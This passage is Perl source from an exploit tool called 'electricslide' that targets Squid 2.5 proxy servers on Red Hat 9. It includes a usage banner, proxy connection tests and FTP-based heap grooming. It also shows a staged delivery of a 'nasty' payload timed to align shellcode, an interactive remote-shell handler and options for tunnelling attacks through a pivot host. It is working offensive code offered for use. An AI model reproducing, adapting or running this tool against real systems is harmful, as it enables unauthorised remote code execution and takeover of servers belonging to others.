	if (!defined($listen_port)) { &print_usage("You missed -l <ip:PORT>"); }
	if (!defined($target_type)) { &print_usage("You missed -o <type>"); }
}

################################################################################
# Sub print_usage
################################################################################
sub print_usage {

    $message = shift;

    print "
--------------------------------------------------------------------------------
 Build Date: Aug 23 2004
 Build Time: 19:17:00
 Version: 3.1
 Usage: ./electricslide -t <ip:port> -o <target_type> -d <delay>
                   -l <ip:port> [-U <user>] [-P <pass>] [-n <port>] [-f <ip:port>] [-a <local addr>]

        -h, --help          Print this helpful message           
        -t, --target         Target Squid server ip
        -o, --target-type   Target type (see list below)
        -l, --listen        Electricslide listen port which Squid will connect to
        -U, --proxy-user    Proxy-Auth user name (if required)
        -P, --proxy-pass    Proxy-Auth password (if required)
        -n, --nopen         Set to port of UDP nopen tunnel
        -f, --nopen_forward The address and port of the target machine to forward
                               the attack to through the nopen tunnel
        -a, --local-addr    The local ip address (not 127.0.0.1)
        -d, --delay         Web server exploit transmit delay
                             (The web server will delay the last
                             400 bytes of the payload this number of seconds. 
                             This ensures that the shellcode will be in proper 
                             alignment when the exploit occurs. Default 30)
 
        Examples:
        - Shooter with receiver on port 80:
                ./electricslide -t 172.16.0.69:3128 -l 192.168.1.1:80 -d 30 -o 0
 
        - Shooter with receivers on port 80 using proxy auth:
                ./electricslide -t 172.16.0.69:3128 -l 192.168.1.1:80 -d 30 -o 0
                           -U \"user\" -P \"password\" 

		- Through a nopen tunnel from local box to 2.2.2.2, attacking 3.3.3.3
				./electricslide.pl -t 127.0.0.1:7777 -l 2.2.2.2:8888 -o 0
					-n 9999 -f 3.3.3.3:3128
			- assumes a nopen client connected to 2.2.2.2, with a UDP tunnel
				on 9999 (nopen> -tunnel 9999 udp)
 
--------------------------------------------------------------------------------
 0) Redhat 9.0 Squid 2.5-STABLE1 RPM w/https support (default included w/RH 9.0)
" .
# These aren't in here yet...
# 1) Default Config & Compile of Squid 2.5-STABLE* (default compile from source)
# 2) Redhat 9.0 Squid HIDEOS compiled w/https support (very custom compile)
"--------------------------------------------------------------------------------
 
NOTE: ONLY ONE TARGET TYPE HAS BEEN CONVERTED

";
    print("$message\n");
    exit;
}

################################################################################
# Sub test_http_connection
################################################################################
sub test_http_connection {

	print "\n";
	print "--> Testing proxy http connection\n";
	# Setup socket listener to receive test client request
	$listener = &sock_listen($listen_port);
	
	# Connect to proxy to send test client request
	print "--> Creating socket connection...\n";
	$sock_c = &sock_connect($target_ip, $target_port);
	sleep 3;
	print "--> Connection successful\n";
	# Send test client request
	print "--> Sending client request...\n";
	syswrite($sock_c,$test_http_client_request);

	$SIG{'ALRM'} = \&sig_alrm_test;
	alarm(30);
	# Make sure we are not processing someone else's connection to us
	$buf_r = "crap";
	while ($buf_r !~ /$test_http_client_tag/s) {
		if ($buf_r ne "crap") {
			print "--! EXTRANEOUS CONNECTION: IGNORED\n";
		}
		# Accept proxy connection with listener
		$sock_r = $listener->accept();
		$buf_r = &sock_read($sock_r);
		# Print what was received
		print "-" x 80 . "\n" . substr($buf_r,0,512) . "\n" . "-" x 80 . "\n";
		# Send not found response
		syswrite($sock_r,$test_http_server_response);
	}
	alarm(0);

	# Close down accepted http socket
	shutdown($sock_r, 2) || die "$!\n";;
	print "--> Success!\n";
	
	# Close down connection to proxy and socket listener
	shutdown($sock_c, 2) || die "$!\n";
	shutdown($listener, 2) || die "$!\n";;
}

################################################################################
# Sub test_ftp_connection
################################################################################
sub test_ftp_connection {

	print "\n";
	print "--> Testing proxy ftp connection...\n";
	# Setup socket listener to receive test client request
	$listener = &sock_listen($listen_port);
	
	# Connect to proxy to send test client request
	print "--> Creating socket connection...\n";
	$sock_c = &sock_connect($target_ip, $target_port);
	sleep 3;
	print "--> Connection successful\n";
	# Send test client request
	print "--> Sending client request...\n";
	syswrite($sock_c,$test_ftp_client_request);

	$SIG{'ALRM'} = \&sig_alrm_test;
	alarm(30);
	# Make sure we are not processing someone else's connection to us
	$buf_r = "crap";
	while ($buf_r !~ /^USER/is) {
		if ($buf_r ne "crap") {
			print "--! EXTRANEOUS CONNECTION: IGNORED\n";
		}
		# Accept proxy connection with listener
		$sock_r = $listener->accept();
		# Send ftp greeting
		syswrite($sock_r,$ftp_server_response);
		$buf_r = &sock_read($sock_r);
		# Print what was received
		print "-" x 80 . "\n" . substr($buf_r,0,512) . "\n" . "-" x 80 . "\n";
	}
	alarm(0);

	# Close down accepted ftp socket
	shutdown($sock_r, 2) || die "$!\n";;
	print "--> Success!\n";
	
	# Close down connection to proxy and socket listener
	shutdown($sock_c, 2) || die "$!\n";
	shutdown($listener, 2) || die "$!\n";;

}

################################################################################
# Sub check_continue
################################################################################
sub check_continue {

	my $string = (shift);
	print $string;
	my $resp = (<STDIN>);
	print "\n";
	if ($resp !~ m/^y/i) {
		print "\n--> Exiting!\n\n";
		exit;
	}
}

################################################################################
# Sub groom_ftp
################################################################################
sub groom_ftp {

	# Setup socket listener to receive test client request
	$listener = &sock_listen($listen_port);
	# Setup select array to put the accepted connections in
	$s_arr = IO::Select->new();
	$s_arr->add($listener);
	# Setup clients and send ftp requests
	for ($i=0; $i < $max_ftp_clients; $i++) {
		if ($sock_c[$i] = &sock_connect($target_ip, $target_port)) {
			print "--> Initiating FTP connection with client #$i\n";
			$s_arr->add($sock_c[$i]);
			print "--> Sending FTP request with client #$i\n";
			print {$sock_c[$i]} $ftp_client_request;
		}
	}
	
	$SIG{'ALRM'} = \&sig_alrm_ftp;
	print "\n--> Setting ftp grooming session timeout to: $ftp_timeout\n";
	sleep 1;
	alarm($ftp_timeout);
	$i = 0;
	my $data_connections = 0;
	while (!$ftp_alarm && (@ready = $s_arr->can_read) ) {
		foreach $fh (@ready) {
			if($fh == $listener) {
				# Create a new socket
				$sock_r[$i] = $listener->accept;
				printf "--> Received connection from %s\n", &safe_inet_ntoa($sock_r[$i]->peeraddr);
				print "--> Sending FTP hello\n";
				print {$sock_r[$i]} "220 hello Microsoft Ftp Service.\r\n";
				$s_arr->add($sock_r[$i]);
				$i++;
			} else {
				# Process socket
				$buf_r = &sock_read_quiet($fh);
				# Break out if nothing was read
				next if (length($buf_r) == 0);

				if ($buf_r =~ m/^USER/i) {
					syswrite($fh,"331 Anonymous allowed.\r\n");
				} elsif ($buf_r =~ m/^PASS/i) {
					syswrite($fh,"230 Anonymous logged in.\r\n");
				} elsif ($buf_r =~ m/^TYPE I/i) {
					syswrite($fh,"200 Type set to I.\r\n");
				} elsif ($buf_r =~ m/^MDTM/i) {
					syswrite($fh,"550 The system can not find the file specified.\r\n");
				} elsif ($buf_r =~ m/^SIZE/i) {
					syswrite($fh,"550 The system can not find the file specified.\r\n");
				} elsif ($buf_r =~ m/^PASV/i) {
					syswrite($fh,"502 Command not implemented.\r\n");
				} elsif ($buf_r =~ m/^PORT/i) {
					syswrite($fh,"200 PORT command successful.\r\n");
					# Get rid of new lines
					$buf_r =~ s/\r//g;
					$buf_r =~ s/\n//g;
					my @port_args = split(/,/,$buf_r);
					my $data_port = unpack("S", pack('C', $port_args[5]) . pack('C', $port_args[4]) );
					print "$data_connections: $buf_r - $port_args[4] - $port_args[5] - $data_port\n";
					push(@data_ports, $data_port);

					if($nopen) {
						# here is where we dynamically set up our local nopen listen ports
						my $local_listener_string = "l $data_port $nopen_forward_ip  ";
						syswrite($nopen_sock, $local_listener_string);
						sleep 1;
					}

				} elsif ($buf_r =~ m/^STOR/i) {
					syswrite($fh,"150 Opening BINARY mode data connection.\r\n");
					# Connect to FTP data port
					my $data_port = pop(@data_ports);
					printf "--> Opening BINARY mode data connection to %s:$data_port\n", &safe_inet_ntoa($fh->peeraddr);
					$sock_d[$data_connections] = &sock_connect(&safe_inet_ntoa($fh->peeraddr),$data_port);
					$data_connections++;
				} else {
					#printf "-" x 80 . "\n" . "--> Received spurious data from: %s\n", &safe_inet_ntoa($fh->peeraddr);
					#print substr($buf_r,0,512) . "\n" . "-" x 80 . "\n";
					syswrite($fh,"502 Command not implemented.\r\n");
				}
				# Looks like we have finished with the socket
				#$sel->remove($fh);
			}
		}
		if ($data_connections >= $max_ftp_clients) {
			last;
		}
	}
	alarm(0);
	
	# Check for ftp alarm...if should continue
	if ($ftp_alarm) {
		print "\n--! Looks like ftp session timeout alarm went off after $ftp_timeout seconds.\n";
		# Check for continue
		&check_continue("\n--> Continue exploit (y/n): ");
	}
	
	# Shutdown the data connections prematurely to reset squid child
	shutdown($listener, 2);
	for ($i=0; $i <= $#sock_d; $i++) {
		#print "--> Shutting down FTP connection #$i\n";
		shutdown($sock_d[$i], 2);
	}
	
	for ($i=0; $i <= $#sock_c; $i++) {
		print "--> Shutting down FTP connection #$i\n";
		shutdown($sock_c[$i], 2);
	}
	
	for ($i=0; $i <= $#sock_r; $i++) {
		#print "--> Shutting down FTP connection #$i\n";
		shutdown($sock_r[$i], 2);
	}
}

################################################################################
# Sub exploit
################################################################################
sub exploit {

	print "\n";
	print "--> Initiating client exploit request...\n";
	# Setup socket listener to receive test client request
	$listener = &sock_listen($listen_port);
	
	# Connect to proxy to send test client request
	$sock_c = &sock_connect($target_ip, $target_port);
	print "--> Waiting $sock_verify_time seconds to verify good connection\n";
	sleep $sock_verify_time;
	my $wtf = 1;
	# This loop is to account for redirectors and give squid time to reinitialize
	# mth - added the wtf variable because often, this while loop would get skipped
	# when it appears the socket was actuall NOT connected
	# i can't explain it, but making the script go through this loop once hasn't
	# failed me yet in the lab environment
	while ( $wtf || !$sock_c->connected()) {
		$wtf=0;
		print "--! Client failed to connect, retrying...\n";
		# Connect to proxy to send test client request
		$sock_c = &sock_connect($target_ip, $target_port);
		print "--> Waiting $sock_verify_time seconds to verify good connection\n";
		sleep $sock_verify_time;
	}
	
	print "--> Client appears to be connected\n";
	print "--> Sending client exploit request...\n";
	# Send test client request
	syswrite($sock_c,$nasty_client_request);

	#&check_continue("er? (y/n)");
	
	# Make sure we are not processing someone else's connection to us
	$buf_r = "crap";
	while ($buf_r !~ /$http_client_tag/is) {
		if ($buf_r ne "crap") {
			print "--! EXTRANEOUS CONNECTION: IGNORED\n";
			shutdown($sock_r, 2);
		}
		# Accept proxy connection with listener
		$sock_r = $listener->accept();
		$buf_r = &sock_read($sock_r);
		# Print what was received
		print "-" x 80 . "\n" . substr($buf_r,0,512) . "\n" . "-" x 80 . "\n";
	}
	
	$sock_r->blocking(0);
	# Send exploit response
	print "--> Sending initial payload\n";
	syswrite($sock_r,$nasty_server_response1) || die "Cant send first response: $!\n";
	print "--> Waiting $delay seconds to ensure memory alignment\n";
	sleep $delay;
	# Read any residual crap on the socket buffer
	$buf_r = &sock_read_quiet($sock_r);
	print "--> Sending followup payload\n\n";
	syswrite($sock_r,$nasty_server_response2) || die "Cant send second response: $!\n";
}

################################################################################
# Sub shell_interface
################################################################################
sub shell_interface {
	$s_arr = IO::Select->new();
	$s_arr->add($sock_r);
	$s_arr->add(\*STDIN);

	print "in shell_interface, sock_r is [".$sock_r->sockhost().":".$sock_r->sockport()."] to [".$sock_r->peerhost().":".$sock_r->peerport()."]\n";
#	if($nopen) {
#		# we need a local socket to redirect local sock_r.sockport to sock_r->peerhost:sock_r->peerport
#
#		syswrite($nopen_sock, "s ");
#		sleep 1;
#
#		my $nopen_string = "l ".$sock_r->sockport()." ".$sock_r->peerhost()." ".$sock_r->peerport()." ";
#		syswrite($nopen_sock, $nopen_string);
#		sleep 1;
#	}
	
	# Shellcode interface
	my ($line);
	while( @ready = $s_arr->can_read() ) {
		foreach $fh (@ready) {
			if ($fh == \*STDIN) {
				# reads input from stdin and prints to socket
				&read_input($sock_r);
				
			} elsif ($fh == $sock_r) {
				if ( $sock_r->connected() ) {
					&read_sock($sock_r);
					$first_shell_read = 0;
				} else {
					print("shit: $!\n");
					shutdown($sock_r, 2);
					exit;
				}
			} else {
				print("shit: Shouldnt be here\n");
				#shutdown($sock_r, 2);
			}
		}
	}
	
	# Close down connection to proxy and socket listener
	shutdown($sock_c, 2) || die "$!\n";
	shutdown($listener, 2) || die "$!\n";;
}
